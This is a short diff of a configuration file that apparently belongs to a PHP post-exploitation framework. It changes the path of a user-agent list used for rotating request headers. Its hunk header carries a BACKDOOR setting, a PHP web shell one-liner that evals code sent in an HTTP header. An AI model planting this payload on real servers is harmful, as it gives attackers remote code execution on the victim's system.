@@ -36,7 +36,7 @@ BACKDOOR=<?php @eval($_SERVER['HTTP_%%PASSKEY%%']);?>
 ###          HTTP_USER_AGENT=Firefox 3.6.8 (FreeBSD)
 ### A value starting with file:// will randomly choose
 ### one line as value for each use
-HTTP_USER_AGENT=file://misc/http/User-Agent.lst
+HTTP_USER_AGENT=file://framework/misc/http_user_agents.lst
 
 ######### TEXTEDITOR #########
 ### soft to use for text edition
